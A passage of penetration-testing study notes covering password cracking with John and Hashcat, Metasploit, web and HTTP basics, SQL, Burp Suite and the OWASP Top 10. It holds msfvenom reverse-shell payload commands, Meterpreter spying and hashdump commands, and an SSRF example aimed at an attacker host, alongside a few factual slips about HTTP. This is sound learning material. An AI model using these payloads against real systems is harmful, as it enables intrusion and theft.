4. Result from step 3 is then hashed again with the same hash function but using the padded key XORed with another constant.
5. The final ouput is the HMAC value, typically a fixed-size string.

Technically, the HMAC function is calculated using the following expression:

<i>HMAC(K,M) = H((K⊕opad)||H((K⊕ipad)||M))</i>

Note: <i>M</i> and <i>K</i> are the message and key

## Cracking Password Hashes
Online tools such as [Hashcat](https://hashcat.net/hashcat/) and [John the Ripper](https://www.openwall.com/john/) can be used to crack hashes.

### Hashcat
Hashcat uses the following basic syntax:

**hashcat -m <hash_type> -a <attack_mode> hashfile wordlist**

### John the Ripper
John uses the following basic syntax:

**john [options] [file_path]**

+ **john --wordlist=[path_to_wordlist] [path_to_file]**: automatic cracking

+ **john --format=[format] --wordlist=[path_to_wordlist] [path_to_file]**: format-specific cracking

Note: tools such as [hash-id.py](https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master) is a useful hash-identifier tool to determine formats.

**john --list=formats**: list all formats

### Windows Authentication Cracking
You can acquire NTHash/NTLM hashes by dumping the SAM database using tools such as Mimikatz or using the Active Directory database NTDS.dit. Using John, use **--format=nt**.


### /etc/shadow Cracking:
To crack /etc/shadow passwords, you must combine it with the /etc/passwd file. You can do this using the <i>unshadow</i> tool.

**unshadow [path_to_passwd_file] [path_to_shadow_file]**: invokes shadow tool

Note: you can use the entire files or just the relevant line from each

### Single Crack Mode:
Single crack mode uses word mangling, which mutates a starting word (e.g. a username) to generate a wordlist based on relevant factors for the target you're trying to crack. John's word mangling is also compatible with the GECOS field, which contains general information about a user found in /etc/shadow.

**john --single --format=[format] [path_to_file]**: use single crack mode

Note: prepending the hash with the user name is needed (e.g. adding mike to 1efee03cdcb96d90ad48ccc7b8666033 -> mike:1efee03cdcb96d90ad48ccc7b8666033)

### Custom Rules
John can create passwords dynamically by defining password rules. This is beneficial when you know more information about the password structure of a target (e.g. password complexity requirements).

Custom rules are defined in <i>/etc/john/john.conf</i>. A rule entry will look like the following:

[List.Rules:RuleName] -> used to define the name of your rule; this is what you will use to call your custom rule a John argument

cAz"[0-9] [!$%#@]" -> rules and character append/prepend 

The most common modifiers include:
+ Az - takes the word and appends it with the characters you define
+ A0 - takes the word and prepends it with the characters you define
+ c - capitalises the character positionally

Common modifier patterns include:
+ [0-9] - will include numbers 0 to 9
+ [0] - will include only the number 0
+ [A-z] - will include both upper and lowercase
+ [A-Z] - will include only uppercase letters
+ [a-z] - will include only lowercase letters

Note: you can read more about custom rules in [Openwall](https://www.openwall.com/john/doc/RULES.shtml).

**john --wordlist=[path_to_wordlist] --rule=[rule_name] [path_to_file]**: invoke custom rule exploitation

### Cracking Password Protected Zip Files
The <i>zip2john</i>  tool can be used to convert the zip file into a hash format that John can understand and crack.

The basic syntax is as follows:

**zip2john [options] [zip_file] > [output_file]**

Note: [options] allows you to pass specific checksum options, which is often not necessary; e.g. zip2john zipfile.zip > zip_hash.txt

The output from zip2john can now be cracked using regular wordlists.

### Cracking Password Protected RAR Files
Similar to zip files, the <i>rar2john</i> tool can be used to convert the rar file into a hash format.

The basic syntax is as follows:

**rar2john [rar_file] > [output_file]**

Once again, the output from rar2john can be directly cracked.

### Cracking SSH Keys
John can be used to crack SSH private key passwords of id_rsa files. This can be done using the <i>ssh2john</i> tool. 

The basic syntax is as follows:

**ssh2john [id_rsa_private_key_file] > [output_file]**

Note: if you do not have ssh2john installed, it can be found python <i>/usr/share/john/ssh2john.py</i> on Kali

Once again, the ouput from ssh2john can be directly cracked.

## Metasploit
<i>Metasploit</i> is a powerful tool that can support all phases of a penetration testing engagement. It comprises of a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, etc.

**msfconsole**: launch Metasploit

Some basic commands:
+ **use [module]**: set context/module
+ **show options**: print options related to the module (i.e. variables)
+ **back**: exit a context
+ **info [module]**: print additional information (i.e. extra details)
+ **search [parameter]**: search database for relevant modules; parameters can be CVE numbers, names, type, target systems, etc
+ **exploit**: run a exploit/module; add **-z** to background the session as it opens
+ **background**: background a session and go back to the msfconsole prompt
+ **sessions**: see existing sessions; add **-i [session_number]** to interact with a session

Some basic commands for setting variables:
+ **set [variable] [value]**: set parameter
+ **unset [variable]**: reset parameter; can use **unset all** to reset all parameters
+ **setg [variable] [value]**: set a global parameter
+ **unset [variable]**: reset a global parameter

### Port Scanning
Metasploit has a number of modules to scan open ports on the target system and network (e.g. search portscan). Note: you can also use nmap commands using the msfconsole prompt. 

For speedier scanning, Metasploit is not the first choice. However, it does provide useful modules for the following:
+ UDP service identification -> the <i>scanner/discover/udp_sweep</i> module allows to quickly identify services running over UDP (i.e. quick way to identify DNS/NetBIOS)
+ SMB scans -> auxiliary modules such as <i>smb_enumshares</i> and <i>smb_version</i> are especially useful in corporate networks

### Metasploit Database
Using the database function can simplify project management when working with several targets.

To initialise:
+ run **systemctl start postgresql** to start the PostgreSQL database
+ run **msfdb init** to initialise the Metasploit database
+ run **msfconsole** as normal; check database status using **db_status**

**help**: shows database backends commands menu

**workspace**: access workspaces; **-a** to add a workspace, **-d** to delete a workspace; **-h** to list available options

Useful commands:
+ **db_nmap** -> run Nmap scan that will be saved to the database
+ **hosts** -> lists all scanned hosts; add **-R** to set RHOSTS to saved hosts
+ **services** -> list all scanned services; add **-S [service]** to search for specific services; useful to search for http, ftp, smb, ssh, rdp

### Vulnerability Scanning
Finding vulnerabilities will rely heavily on your ability to scan and fingerprint the target. 

Use the **info** command for any module to have a better understanding of its use and purpose.

### Exploitation
Most exploits will have a preset default payload. You can use **show payloads** to list other commands you can use.

Once you have decided on a payload, you can use **set payload** to make your choice. Note: choosing a working payload could become a trial and error process due to the enviromental/OS restrictions (i.e. firewall rules, anti-virus, file writing, or program availability). 

Remember, a session can be backgrounded using **-z** or CTRL+Z. Some additional session commands:
+ **sessions** ->  list all active sessions
+ **sessions -i [session_id]** -> interact with an existing session
+ **sessions -h** -> list options (e.g. **-C** to run a Meterpreter command, **-K** to terminate all sessions)

### Msfvenom
<i>Msfvenom</i> allows you to access all payloads available in the Metasploit framework, allowing you to create them in many different formats (e.g. PHP, exe, dll, elf) and for many different target systems (e.g. Apple, Windows, Android, Linux)

**msfvenom -l payloads**: lists all framework payloads

**msfvenom --list formats**: list supported output formats

Some tools include:
+ Encoders - encodes the payload; modern obfuscation techniques or learning methods to inject shellcode are better; eg. **msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64**
+ Handlers - catches callbacks from reverse shells or Meterpreter (i.e. a listener); follows these steps: 1) use exploit, 2) set payload, 3) set lhost/lport variables, 4) run

Based on the target's configuration (i.e. OS, webserver, interpreter, etc), msfvenom can be used to create payloads in proper formats. Here are examples often used:
+ Linux Executable and Linkable Format (elf) -> **msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf**; note that executable permissions need to be set using **chmod +x [shell_elf_file]**
+ Windows -> **msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe**
+ PHP -> **msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php**
+ ASP -> **msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp**
+ Python -> **msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py**

Note: for the above examples, a handler will be needed as these are reverse payloads

### Meterpreter
<i>Meterpreter</i> is a Metasploit payload that runs on a target system and acts as an agent within a command and control architecture. Interaction with the target OS and files is possible using Meterpreter's commands.

Meterpreter runs on the target system in memory (i.e. RAM) and does not write itself to the disk (i.e. not installed). This feature is added to avoid detection by AVs, which scans new files on disk. Meterpreter also avoids detection by network-based IPS/IDS by using encrypted communication with the server where Metasploit runs (i.e. your attacking machine using TLS). Note: this feature only provides some degree of stealth as Meterpreter is recognised by major AVs.

Your decision on which version of Meterpreter to use will be decided by three factors:
1. The target's OS (i.e. Linux, Windows, Mac, Android)
2. Components available on the target system (e.g. Python, PHP website)
3. Network connection types you can have with the target system (e.g. TCP, HTTPS reverse connection, IPv6 or IPV4)

**help** on any Meterpreter session will list all available commands. These commands include:

Core commands
+ **background**: backgrounds the current session
+ **exit**: terminate the session
+ **guid**: get the session GUID
+ **help**: display the help menu
+ **info**: displays information about a Post module
+ **irb**: opens an interactive Ruby shell on the current session
+ **load**: loads one or more Meterpreter extensions
+ **migrate**: migrate Meterpreter to another process
+ **run**: executes a Meterpreter script or Post module
+ **sessions**: quickly switch to another session

File system commands
+ **cd**: change directory
+ **ls**: list files in the current directory; **dir** works the same way
+ **pwd**: print current working directory
+ **edit**: edit a file
+ **cat**: show contents of a file to the screen
+ **rm**: delete the specified file
+ **search**: search for files
+ **upload**: upload a file or directory
+ **download**: download a file or directory

Networking commands
+ **arp**: display the host ARP cache
+ **ifconfig**: displays the network interfaces available on the target system
+ **netstat**: displays the network connections
+ **portfwd**: forwards a local port to a remote service
+ **route**: view and modify the routing table

System commands
+ **clearev**: clear the event logs
+ **execute**: execute a command
+ **getpid**: show the current process identifier
+ **getuid**: show the user that Meterpreter is running as
+ **kill**: terminates a process
+ **pkill** terminates processes by name
+ **ps**: list running processes
+ **reboot**: reboots the remote computer
+ **shell**: drops into a system command shell
+ **shutdown**: shuts down the remote computer
+ **sysinfo**: gets information about the remote system (e.g. OS)

Other commands
+ **idletime**: returns the number of seconds the remote user has been idle
+ **keyscan_dump**: dumps the keystroke buffer
+ **keyscan_start**: starts capturing keystrokes
+ **keyscan_stop**: stops capturing keystrokes
+ **screenshare**: allows you to watch the remote user's desktop in real time
+ **screenshot**: grabs a screenshot of the interactive desktop
+ **record_mic**: records audio from the default microphone for X seconds
+ **webcam_chat**: starts a  video chat
+ **webcam_list**: lists webcams
+ **webcam_snap**: takes a snapshot from the specified webcam
+ **webcam_stream**: plays a video stream from the specified webcam
+ **getsystem**: attempts to elevate your privilege to that of local system
+ **hashdump**: dumps the contents of the SAM database

Note: these commands may not all work due to various factors (e.g. target system does not have web cam or is running on a VM)

## Web Applications
When you visit a website, your browser makes a request to a web server asking for information about the page you are trying to visit. It will then respond with data that your browser uses to show you the page. 

There are two major components that make up a website:
1. Front End (Client-Side) - the way your browser renders a website
2. Back End (Server-Side) - server that processes your request and returns a response

Websites are primarily created using:
+ HyperText Markup Language (HTML) - to build websites and define their structure
+ CSS - to add styling options
+ JavaScript - to implement complex features on pages using interactivity

In a browser, you can view <i>Page Source</i> to see website elements. Note that sometimes, sensitive information can be left here (e.g. login credentials)

Other website components include:
+ <i>Load Balancers</i> - provides two main features: 1) ensure high traffic websites can handle the load, and 2) provide a failover if a server becomes unresponsive
+ <i>Content Delivery Networks (CDN)</i> - cuts down traffic to a busy website by allowing hosting of static files from your website to other servers; the nearest server is physically located and sends the request there for efficiency
+ <i>Databases</i> - communicates with webservers to store and recall data; examples include MySQL, MSSQL, MongoDB, Postgred, etc
+ <i>Web Application Firewall (WAF)</i> - protects the web servers from hacking or DoS attacks (e.g. bot detection, rate limiting)

A <i>web server</i> is a software that listens for incoming connections and uses the HTTP protocol to deliver web content to clients. Common web server software include Apache, Nginx, IIS, and NodeJS. Web servers delivers files from the root directory (e.g. /var/www/html for Linux OS, C:\inetpub\wwwroot for Windows OS).

Web servers use <i>virtual hosts</i> to host multiple websites with different domain names. They do this using text-based configuration files. There is no limit to the number of different websites you can host on a web server.

<i>Static content</i> is content that never changes. Common examples are pictures, JavaScript, CSS, HTML, etc. 

<i>Dynamic content</i> is content that could change with different requests. Examples include searching in a website. These changes are done in the backend using programming and scripting languages. Some examples of the languages include PHP, Python, Ruby, NodeJS, Perl, etc. 

### Uniform Resource Locator (URL)
A <i>Uniform Resource Locator (URL)</i> is used as an instruction on how to access a resource on the net. URLs have multiple parts. Take for example http://user:password@tryhackme.com:80/view-room?id=1#task3
+ Scheme - instructs on what protocol to use (e.g. HTTP, HTTPS, FTP)
+ User - some services require authentication to log in
+ Host - domain name or IP address of the server
+ Port - port you are going to connect to (e.g. TCP ports 80/8080 for HTTP, 443/8443 for HTTPS)
+ Path - file name or location of the resource
+ Query String - extra bits of information that can be sent to the requested path
+ Fragment - reference to a location on the actual page requested, commonly used for pages with long content

### HTTP Messages
HTTP messages are packets of data exchanged between a user (i.e. the client) and the web server. There are two types of HTTP messages:
+ HTTP Requests - sent by the user to trigger actions on the web application
+ HTTP Responses - sent by the server in response to the user's request

Each message follows a specific format that helps both the user and the server communicate smoothly:
+ Start Line - like an introduction; tells what kind of message is being sent (i.e. whether a request or a response) and gives details about how the message should be handled
+ Headers - key-value pairs that provide extra information; gives instructions to both client and server for handling the request/response; can cover security, content types, etc
+ Empty Line - divider that separates the header from the body
+ Body - where actual data is stored; might include data user wants to send or where the server puts the content that the user requested

### HTTP Requests: Request Line & Methods
The <i>request line</i> or start line is the first part of an HTTP request and has three main parts:
+ HTTP method
+ URL path
+ HTTP version

E.g. METHOD /path HTTP/version

HTTP methods show the client's intended action when making HTTP requests. The most common include:
+ GET - used for getting information from a web server; Note: avoid putting sensitive info like tokens or passwords
+ POST - used for submitting data to the web server and potentially creating new records; Note: always validate and clean input to avoid attacks (e.g. SQL injection or XSS)
+ PUT - used for submitting data to a web server to update information; Note: ensure user is authorised to make changes
+ DELETE - used for deleting information/records from a web server; Note: ensure user is authorised to delete resources
+ PATCH - updates part of a resource; Note: always validate data to avoid inconsistencies
+ HEAD - works like GET but only retrieves headers (i.e. for matadata)
+ OPTIONS - tells you what methods are available; Note: many servers disable this for security reasons
+ TRACE - shows which methods are allowed; Note: many servers disable this for security reasons
+ CONNECT - used to create a secure connection; Note: it is not as common but is critical for encrypted communication

The <i>URL path</i> tells the server where to find the resource the user is asking for. 

E.g. URL - https://tryhackme.com/api/users/123, path - /api/users/123

It is crucial to follow these secure practices to avoid common attacks:
+ Validate the URL path to prevent unauthorised access
+ Santisise the path to avoid injection attacks
+ Protect sensitive data by conducting privacy and risk assessments

The <i>HTTP version</i> shows the protocol version used to communicate between the client and server. Here are the most common ones:
+ HTTP/0.9 - the first version; only supported GET requests
+ HTTP/1.0 - added headers and better support for different types of content; improved caching
+ HTTP/1.1 - brought persistent connections, chunked transfer coding, and better caching; it is still widely used today
+ HTTP/2 - introduced multiplexing, header compression, and prioritisation for faster performance
+ HTTP/3 - built on HTTP/2 but uses QUIC for quicker and more secure connections

### HTTP Request: Headers & Body
<i>Headers</i> are additional bits of data you can send to the web server when making requests. Common headers include:
+ Host - specifies the name of the web server the request is for (e.g. tryhackme.com)
+ User-Agent - information about the web browser the request is coming from (e.g. Mozilla/5.0)
+ Referer - indicates the URL from which the request came from (e.g. https://www.google.com/)
+ Cookie - information the web server previously asked the web browser to store (e.g. user_type=student, room=introtowebapplication, room_status=in_progress)
+ Content-Type - describes what type or format of data is in the request (e.g. application/json)

For POST and PUT, where data is sent to the web server, data is located inside the <i>Request Body</i>. The formatting of the data can take many forms. Some common ones include:
+ URL Encoded (i.e. application/x-www-form-urlencoded) - data is structured in key-value pairs, each separated by & (e.g. key1=value1&key2=value2); special characters are percent-encoded
+ Form Data (i.e. multipart/form-data) - allows multiple data blocks to be sent where each block is separated by a boundary string, which is defined in the header (e.g. boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW)
+ JSON (i.e. application/json) - data sent using the JSON structure; formatted in pairs of name:value; multiple pairs are separated by comas and all contained within { } braces
+ XML (i.e. application/xml) - data is structured inside labels called tags, which can be nested within each other (e.g. <user><name>Aleksandra</name></user> 

Common request headers include:
+ Host - specify which website you require
+ User-Agent - your browser software and version number; aids in formatting website to your browser needs
+ Content-Length - tells web server how much data to expect in the web request
+ Accept-Encoding - tells web server what types of compression methods your browser supports for smaller data transmission
+ Cookie - data sent to server to help remember your information

Common response headers include:
+ Set-Cookie - information to store, which gets sent back to the web server on each request
+ Cache-Control - how long to store the content of the response in the browser's cache before requesting again
+ Content-Type - tells the client what type of data is being returned (e.g. HTML, CSS, JavaScript, images, etc)
+ Content-Encoding - what method has been used to compress the data for smaller data transmission

### HTTP Response: Status Line & Status Codes
The first line in every HTTP response is the <i>Status Line</i>. This includes three parts:
+ HTTP version - details which version of HTTP is used
+ Status Code - three-digit number showing the outcome of the request
+ Reason Phrase - short message explaining the status code in human-readable terms

Common HTTP status codes:
| Code | Description |
| :-----: | :--------: |
| 200 - OK | Request completed successfully |
| 201 - Created | Resources has been created |
| 301 - Moved Permanently | Redirects to a new webpage or tells search engines to look elsewhere |
| 302 - Found | Similar to 302 but only a temporary change |
| 400 - Bad Request | Something is wrong or missing in the request |
| 401 - Not Authorised | Not currently allowed to view resource |
| 403 - Forbidden | No permission to view the resource |
| 405 - Method Not Allowed | Resource does not allow the method request |
| 404 - Page Not Found | Requested resource does not exist |
| 500 - Internal Service Error | Server has encountered some error |
| 503 - Service Unavailable | Server is either overloaded or down for maintenance |

### HTTP Response: Headers & Body
<i>Response headers</i> provide essential information that the client and server need to process everything correctly. These include:
+ Date - shows exact data and time when the response was generated (e.g. Date: Fri, 23 Aug 2024 10:43:21 GMT)
+ Content-Type - tells the client what kind of content it is getting (i.e. HTML, JSON); includes the character set to help the browser display it correctly (e.g. Content-Type: text/html; charset=utf-8)
+ Server - shows the kind of server software is handling the request (e.g. Server: nginx); Note: revealing server information might be useful for attackers, so consider removing/obscuring this
+ Set-Cookie - sends cookies from the server to the client (e.g. sessionId=38af1337es7a8); can use the HttpOnly flag (i.e. cannot be accessed by JavaScript) and the Secure flag (i.e. only sent over HTTPS)
+ Cache-Control - tells the client how long it can cache the response before checking in again (e.g. Cache-Control: max-age=600); use no-cache to prevent sensitive info from being cached
+ Location - used in redirection responses (i.e. 3XX status codes); tells the client where to go next if the resource has moved

The <i>response body</i> is where the actual data lives. These can be HTML, JSON, images, etc. Note: to prevent injection attacks (e.g. XSS), always sanitise and escape any data (i.e. user-generated content) before including them in the response

### Security Headers
HTTP <i>Security Headers</i> help improve overall security of a web application to provide mitigations against attacks such as XSS, clickjacking, etc. These headers include:
+ Content-Security-Policy (CSP) - additional security layer that can help mitigate against common attacks; provides a way for administrators to say what domains or sources are considered safe (i.e. default-src, script-src, style-src); e.g. Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.tryhackme.com; style-src 'self'
+ Strict-Transport-Security (HSTS) - ensures that web browsers will always connect over HTTPS; e.g. Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
+ X-Content-Type-Options - used to instruct browsers not to guess the MIME time of a resource but only use the Content-Type header; e.g. X-Content-Type-Options: nosniff
+ Referrer-Policy - controls the amount of information sent to the destination web server when a user is redirected from a source web server (e.g. through hyperlink); e.g. Referrer-Policy: no-referrer, Referrer-Policy: same-origin, Referrer-Policy: strict-origin, Referrer-Policy: strict-origin-when-cross-origin

Note: you can use [securityheaders.com](https://securityheaders.io/) to analyse the security headers of any website

### HTML Injection
<i>HTML Injection</i> is a vulnerability that occurs when unfiltered user input is displayed on the page. If a website does not sanitise user input (i.e. filter malicious text input), users can submit HTML or JavaScript code, allowing them to control the page's appearance and functionality.

<i>Input sanitation</i> is a means to protect a website secure. 

## JavaScript
<i>JavaScript (JS)</i> is a scripting language that adds interactive features to websites containing HTML and CSS (e.g. validation, onClick actions, animations, etc). 

JS is an interpreted language, which means the code is executed directly in a browser without prior compilation.

### Variables
There are three ways to declare variables in JS:
+ **var** - function-scoped
+ **let** - block-scoped
+ **const** - block-scoped

### Data Types
Data types include **string**, **number**, **boolean**, **null**, and **object** (i.e. complex data).

### Functions
Functions are designed to perform a specific task. This allows reuse of code, rather than rewriting them.

```
function PrintResult(rollNum) {
            alert("Username with roll number " + rollNum + " has passed the exam");
            // any other logic to display the result
        }
```

### Loops
Loops allow execution of a code block multiple times as long as a condition is true. These include **for**, **while**, and **do..while**. 

```
for (let i = 0; i < 100; i++) {
            PrintResult(rollNumbers[i]); // this will be called 100 times 
        }
```

### Conditional Statements
Control flow basically means deciding the order in which code blocks are executed based on certain conditions. Structures such as **if-else** and **switch** can be used.

```
age = prompt("What is your age")
        if (age >= 18) {
            document.getElementById("message").innerHTML = "You are an adult.";
        } else {
            document.getElementById("message").innerHTML = "You are a minor.";
        }
```

### Internal JS
Internal JS means embedding the JS code directly within an HTML document. The script is inserted between **<script** tags. These can be placed inside the <head> section for scripts that need to be loaded before page content is rendered or inside the <body> section for scripts that interact with elements as they are loaded.

```
 <!DOCTYPE html>
<html lang="en">
<head>
    <title>Internal JS</title>
</head>
<body>
    <h1>Addition of Two Numbers</h1>
    <p id="result"></p>

    <script>
        let x = 5;
        let y = 10;
        let result = x + y;
        document.getElementById("result").innerHTML = "The result is: " + result;
    </script>
</body>
</html>
```

### External JS
External JS uses JS code found in a separate .js file. This helps keep HTML document clean and organised. The .js file can be stored or hosted on the same web server (i.e. same as the HTML doc) or stored on an external web server (i.e. the cloud).

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>External JS</title>
</head>
<body>
    <h1>Addition of Two Numbers</h1>
    <p id="result"></p>

    <!-- Link to the external JS file -->
    <script src="script.js"></script>
</body>
</html>
```
Note: when pen-testing a web application, it is important to check whether internal or external JS is used; this can be done by using View Page Source

### Dialogue Functions
Dialogue boxes can be used to provide interaction with users and dynamically update content on web pages. Note: if not implemented securely, attackers may exploit these features to execute attacks (e.g. XSS).

Some build-in functions include: 

**alert** - displays a message in a dialogue box with an "OK" button; often used for information or warnings

```
alert("HelloTHM");
```

**prompt** - displays a dialogue box that asks users for input

```
name = prompt("What is your name?");
    alert("Hello " + name);
```

**confirm** - displays a dialogue box with a message and "OK" and "Cancel" buttons; this returns true or false based on the response
**prompt**, and **confirm**.

```
confirm("Do you want to proceed?")
```
### Minification & Obfuscation
Minification is the process of compressing JS files by removing spaces, line breaks, comments, and shortening variable names. This reduces the file size and improves web page loading times.

Obfuscation is used to make JS code harder to understand. This renamed variables and functions and even inserts dummy code.

Note: you can use [Code Beautify](https://codebeautify.org/javascript-obfuscator#) to obfuscate code; you can use [Deobfuscator](https://obf-io.deobfuscate.io/) to deobfuscate

### Best Practices
+ Avoid relying on client side validation only, as users can disable/manipulate JS; perform validation on the server side is essential
+ Refrain from adding untrusted libraries (e.g. src attribute in <script>)
+ Avoid hardcoded secrets into your JS code; these include API keys, access tokens, or credentials
+ Minify and obfuscate your JS code; this reduces size, improve load times, and make it harder for attackers to understand code

## SQL
<i>Structured Query Language (SQL)</i> is a programming language that can be used to query, define, and manipulate data stored in a relational database. We use these in popular Database Management Systems (DBMS) such as MySQL, MongoDB, Oracle DB, and Maria DB.

### Database Statements
Create Database
```
CREATE DATABASE database_name;
```
Show Database
```
SHOW DATABASES;
```
Use Database
```
USE database_name;
```
Drop Database
```
DROP DATABASE database_name;
```

### Table Statements
Create Table
```
CREATE TABLE example_table_name (
    example_column1 data_type,
    example_column2 data_type,
    example_column3 data_type
);
```
Show Tables
```
SHOW TABLES;
```
Describe Table
```
Describe table_name;
```
Alter Table
```
ALTER TABLE table_name
ADD example_column data_type;
```
Drop Table
```
DROP TABLE table_name;
```

### CRUD Operations
Create (INSERT) - adds new record to the table
```
INSERT INTO books (id, name, published_date, description)
    VALUES (1, "Android Security Internals", "2014-10-14", "An In-Depth Guide to Android's Security Architecture");
```
Read (SELECT) - retrieves record from the table
```
SELECT * FROM books;
```
Update (UPDATE) - modifies existing data in the table
```
UPDATE books
    SET description = "An In-Depth Guide to Android's Security Architecture."
    WHERE id = 1;
```
Delete (DELETE) - removes record from the table
```
DELETE FROM books WHERE id = 1;
```

### Clauses
Distinct
```
SELECT DISTINCT name FROM books;
```
Group by
```
SELECT name, COUNT(*)
    FROM books
    GROUP BY name;
```
Order by
```
SELECT *
    FROM books
    ORDER BY published_date ASC;
```
```
SELECT *
    FROM books
    ORDER BY published_date DESC;
```
Having
```
SELECT name, COUNT(*)
    FROM books
    GROUP BY name
    HAVING name LIKE '%Hack%';
```
### Logical Operators
Like
```
SELECT *
    FROM books
    WHERE description LIKE "%guide%";
```
And
```
SELECT *
    FROM books
    WHERE category = "Offensive Security" AND name = "Bug Bounty Bootcamp";
```
Or
```
SELECT *
    FROM books
    WHERE name LIKE "%Android%" OR name LIKE "%iOS%";
```
Not
```
SELECT *
    FROM books
    WHERE NOT description LIKE "%guide%";
```
Between
```
SELECT *
    FROM books
    WHERE id BETWEEN 2 AND 4;
```
### Comparison Operators
+ Equal-to (=)
+ Not-equal-to (!=)
+ Less-than (<)
+ Greater-than (>)
+ Less-than-equal-to (<=)
+ Greater-than-equal-to (>=)

### String Functions
CONCAT()
```
SELECT CONCAT(name, " is a type of ", category, " book.") AS book_info FROM books;
```
GROUP_CONCAT()
```
SELECT category, GROUP_CONCAT(name SEPARATOR ", ") AS books
    FROM books
    GROUP BY category;
```
SUBSTRING()
```
SELECT SUBSTRING(published_date, 1, 4) AS published_year FROM books;
```
LENGTH()
```
SELECT LENGTH(name) AS name_length FROM books;
```

### Aggregate Functions
COUNT()
```
SELECT COUNT(*) AS total_books FROM books;
```
SUM()
```
SELECT SUM(price) AS total_price FROM books;
```
MAX()
```
SELECT MAX(published_date) AS latest_book FROM books;
```
MIN()
```
SELECT MIN(published_date) AS earliest_book FROM books;
```

## Burp Suite
<i>Burp Suite</i> is a Java-based framework that provides solutions for web application testing. These days, it is an industry standard tool for hands-on security assessments of web and mobile applications (i.e. those that rely on APIs). In a nutshell, Burp Suite captures and enables manipulation of HTTP/HTTPS traffic between a browser and a web server. 

Note: Burp Suite Professional is the unrestricted version, while Burp Suite Community comes free; Burp Suite Enterprise is primarily used for continuous scanning

Though limited, Burp Suite Community provides key features such as:
+ Proxy - enables interception and modification of requests and responses with web applications
+ Repeater - allows capturing, modifying, and resending the same request multiple times; this is particularly useful when crafting payloads through trial and error (e.g. SQLi) or testing functionality of endpoints for vulnerabilities
+ Intruder - allows spraying endpoints with requests; commonly used for brute-force attacks or fuzzing endpoints
+ Decoder - offers data transformation; this can decode captured information or encode payloads before sending
+ Comparer - enables comparison of two pieces of data at either the word or byte level
+ Sequencer - employed for assessing the randomness of tokens (e.g. session cookie values, randomly generated data)

## OWASP Top 10 (2021)
### 1. Broken Access Control
Broken access control allows attackers to bypass authorisation, which gives them access to sensitive data or perform tasks they should not be able to. 

An example of this is <i>Insecure Direct Object Referencing (IDOR)</i>, which is an access control vulnerability where Direct Object References are exposed in a URL (e.g. https://bank.thm/account?id=111111). These objects can be files, users, account numbers, etc.

### 2. Cryptographic Failures
A cryptographic failure arises from the misuse/lack of cryptographic algorithms for protecting sensitive information (i.e. data in transit, data at rest). These result in the divulging of sensitive data linked to customers (e.g. names, DoBs, financial information, credentials).

These often lead to MitM SQLi attacks.

### 3. Injection
Injection flaws occur when an application interprets user input as commands/parameters. Examples of these include SQL (i.e. passing SQL queries) and command injections (i.e. passing system commands).

The main defence for preventing these attacks is ensuring that user input is not interpreted as queries/commands. These can be achieved by:
+ Using an allow list, where the input is compared to a list of safe inputs or characters; only input that is marked as safe is processed
+ Stripping input, where they are removed before processing if dangerous characters are detected

### 4. Insecure Design
Insecure design occur when an application's architecture is flawed. These can occur when an improper threat modelling is made during planning, which presents itself in the final version. An example of this is insecure password resets, where OTP can be brute-forced.

### 5. Security Misconfiguration
Security misconfigurations are related to keeping security configurations up-to-date. These include:
+ Poorly configured permissions on cloud services (e.g. S3 buckets)
+ Enabling unnecessary features (e.g. services, pages, privileges); an example is [Patreon hack](https://labs.detectify.com/writeups/how-patreon-got-hacked-publicly-exposed-werkzeug-debugger/), where a debugging interface was kept active
+ Default accounts with default passwords
+ Error messages that are overly detailed
+ Not using HTTP security headers

These often lead to more vulnerabilities such as weak credentials, XML or command injections.

### 6. Vulnerable & Outdated Components
You may find that a application is vulnerable to a well-known exploit. In such cases, ready-to-use exploits can be found online (i.e. [Exploit-DB](https://www.exploit-db.com/exploits/41962).

### 7. Identification & Authentication Failures
Flaws in authentication mechanisms allows attackers to gain access to users' accounts and sensitive data. Some common flaws include:
+ Brute force attacks; can be avoided by using a strong password policy
+ Use of weak credentials; can be avoided by enforcing automatic lockouts after a number of attempts
+ Weak session cookies; can be avoided by using MFA

### 8. Software & Data Integrity Failures
These vulnerabilities are caused by the use of code/infrastructure without integrity checks. There are two types of vulnerabilities:
+ Software Integrity Failures 
+ Data Integrity Failures

An example of software integrity can be seen in the use of code libraries. Inserting a library with a Subresource Integrity (SRI), which will be matched against the hash of the downloaded file.

```
<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
```

An example of data integrity can be seen in the use of cookies. Cookies can be tampered with (i.e. changing username), which can potentially lead to impersonation. A solution to this was the use of JSON Web Tokens (JWT), which allow key-value pairs (i.e. header-payload-signature) that the server matches with its own secret key.

### 9. Security Logging & Monitoring Failures
Logging is crucial as it allows tracing of activities. Attackers' actions can be traced, which can then be evaluated for risk and impact. 

The information in logs should include:
+ HTTP status codes
+ Time stamps
+ Usernames
+ API endpoints/page locations
+ IP addresses

### 10. Server-seide Request Forgery (SSRF)
SSRF vulnerabilities allow attackers to coerce a web application into sending requests on their behalf to arbitrary destinations while controling the contents of the requests itself. These arise from the use of third-party services.

Take for example: https://www.mysite.com/sms?server=attacker.thm&msg=ABC

Changing the server parameter to your own server can allow you to obtain the API key (i.e. by listening using Netcat).

SSRF can be used further to:
+ Enumerate internal networks (i.e. IP addresses and ports)
+ Abuse trust relationships between servers and gain unrestricted access to services
+ Interact with non-HTTP services (i.e. to get RCE)

## Hydra
<i>Hydra</i> is a brute force password cracking program tool. This can be used to run through a password list and crack some authentication services (e.g. SSH, web app form, FTP, SNMP). 
